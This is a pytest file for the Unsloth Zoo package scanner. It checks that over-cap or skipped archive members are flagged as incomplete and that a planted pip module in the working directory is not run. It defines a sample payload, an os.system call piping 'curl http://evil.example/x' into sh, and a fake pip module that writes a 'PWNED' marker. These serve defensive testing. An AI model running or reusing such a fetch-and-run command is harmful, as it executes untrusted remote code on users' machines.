# Unsloth Zoo - Utilities for Unsloth
# Copyright 2023-present Daniel Han-Chen, Michael Han-Chen & the Unsloth team. All rights reserved.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

"""scan_packages.py must not report clean when it skipped content it pattern-checks, and must not run a cwd `pip/`."""

from __future__ import annotations

import io
import subprocess
import sys
import tarfile
import warnings
import zipfile
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO_ROOT))
from scripts import scan_packages as sp  # noqa: E402

PAYLOAD = "import os\nos.system('curl http://evil.example/x | sh')\n"


def _checks(findings):
    return {f.check for f in findings}


def test_over_cap_python_member_is_not_clean(tmp_path, monkeypatch):
    monkeypatch.setattr(sp, "HARD_MAX_FILE_BYTES", 1024)
    whl = tmp_path / "pkg-1.0-py3-none-any.whl"
    with zipfile.ZipFile(whl, "w") as zf:
        zf.writestr("pkg/__init__.py", "x = 1\n")
        zf.writestr("pkg/hidden.py", PAYLOAD + "#" * 4096)
    findings = sp.scan_archive(str(whl), "pkg")
    assert "scan_incomplete" in _checks(findings)
    assert any(f.severity in (sp.CRITICAL, sp.HIGH) for f in findings)


def test_member_count_cap_is_not_clean(tmp_path, monkeypatch):
    monkeypatch.setattr(sp, "HARD_MAX_MEMBERS", 3)
    sdist = tmp_path / "pkg-1.0.tar.gz"
    with tarfile.open(sdist, "w:gz") as tf:
        for i in range(5):
            data = f"x = {i}\n".encode()
            info = tarfile.TarInfo(f"pkg-1.0/m{i}.py")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    assert "scan_incomplete" in _checks(sp.scan_archive(str(sdist), "pkg"))


def test_duplicate_zip_name_reads_each_entry(tmp_path, monkeypatch):
    # The second entry with the same name is over the cap; reading by name would pull it in under the first's size.
    monkeypatch.setattr(sp, "HARD_MAX_FILE_BYTES", 1024)
    whl = tmp_path / "pkg-1.0-py3-none-any.whl"
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        with zipfile.ZipFile(whl, "w") as zf:
            zf.writestr("pkg/a.py", "x = 1\n")
            zf.writestr("pkg/a.py", "#" * 8192)
    seen = [len(text) for _, text in sp.iter_archive_files(str(whl), [])]
    assert seen == [6], seen


def test_large_binary_member_stays_clean(tmp_path, monkeypatch):
    # torch / nvidia wheels ship .so members past the cap: never checked, so never a reason to fail.
    monkeypatch.setattr(sp, "HARD_MAX_FILE_BYTES", 1024)
    monkeypatch.setattr(sp, "HARD_MAX_TOTAL_BYTES", 2048)
    whl = tmp_path / "pkg-1.0-py3-none-any.whl"
    with zipfile.ZipFile(whl, "w") as zf:
        zf.writestr("pkg/__init__.py", "x = 1\n")
        zf.writestr("pkg/_C.so", b"\0" * 8192)
        zf.writestr("pkg/data.bin", b"\0" * 1500)
        zf.writestr("pkg/data2.bin", b"\0" * 1500)
        zf.writestr("pkg/z.py", "y = 2\n")
    assert sp.scan_archive(str(whl), "pkg") == []
    assert [n for n, _ in sp.iter_archive_files(str(whl))] == ["pkg/__init__.py", "pkg/z.py"]


def test_pip_does_not_run_from_cwd(tmp_path, monkeypatch):
    checkout = tmp_path / "checkout"
    (checkout / "pip").mkdir(parents = True)
    marker = tmp_path / "PWNED"
    (checkout / "pip" / "__init__.py").write_text("")
    (checkout / "pip" / "__main__.py").write_text(
        f"open({str(marker)!r}, 'w').write('x')\nraise SystemExit(1)\n"
    )
    monkeypatch.chdir(checkout)
    real_run = subprocess.run

    def run(cmd, **kw):
        # Keep it offline: same interpreter and cwd handling, but only `pip --version`.
        cmd = [c for c in cmd[:3]] + ["--version"]
        return real_run(cmd, **kw)

    monkeypatch.setattr(sp.subprocess, "run", run)
    sp.download_packages(["requests==2.32.5"], str(tmp_path / "dest"))
    sp.download_packages(["requests==2.32.5"], str(tmp_path / "dest2"), with_deps = True)
    assert not marker.exists()
